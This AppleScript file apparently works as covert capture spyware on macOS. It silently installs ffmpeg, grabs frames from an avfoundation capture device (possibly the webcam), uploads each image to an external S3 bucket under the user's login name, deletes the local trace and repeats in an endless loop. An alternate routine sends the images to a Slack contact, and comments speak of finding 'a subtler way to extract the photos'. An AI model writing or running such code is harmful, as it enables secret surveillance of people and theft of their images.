global PHOTO_NAME
global PHOTO_LOCATION

on setup()
	set ffmpegFolder to "/usr/local/Cellar/ffmpeg"
	tell application "Finder"
		if not (exists folder ffmpegFolder) then
			--need ffmpeg for command line screenshots; looooong brew install here
			do shell script "/usr/local/bin/brew install ffmpeg"
		end if
	end tell
	set whoami to do shell script "whoami"
	set HomeFolder to (path to current user folder)
	set RootFolder to (path to current user folder)
	set PHOTO_NAME to "image" & (year of (current date)) & "." & (month of (current date)) & "." & (day of (current date)) & "." & (time of (current date))
	set PHOTO_LOCATION to ("/Users/" & whoami & "/" & PHOTO_NAME & ".jpg")
end setup

on copyScreenshotToClipboard()
	set ImageSnapCommand to ("/usr/local/Cellar/ffmpeg/4.2.1/bin/ffmpeg -ss 0.5 -f avfoundation -framerate 30 -i \"0\" -t 1 " & PHOTO_LOCATION)
	try
		--this thing always errors out but the photo is saved just fine
		do shell script ImageSnapCommand
	end try
	set the clipboard to (read (POSIX file PHOTO_LOCATION) as JPEG picture)
end copyScreenshotToClipboard

on focusSlackAndSend()
	--need to find a subtler way to extract the photos...
	--uploadToS3 should be better; keeping this around for funs 
	tell application "Slack" to activate
	tell application "System Events" to keystroke "k" using command down
	tell application "System Events" to keystroke "pete"
	delay 1 -- take your time, slack
	tell application "System Events" to key code 76
	delay 1 -- take your time, slack
	tell application "System Events" to keystroke "v" using command down
	delay 1 -- take your time, slack
	tell application "System Events" to key code 76
end focusSlackAndSend

on uploadToS3()
	do shell script "/usr/local/bin/aws s3 cp " & PHOTO_LOCATION & " s3://pdavidstestimages/$(whoami)/" & PHOTO_NAME
end uploadToS3

on teardown()
	tell application "System Events" to delete alias PHOTO_LOCATION
end teardown

on main()
	setup()
	copyScreenshotToClipboard()
	uploadToS3()
	teardown()
end main

repeat
	main()
end repeat
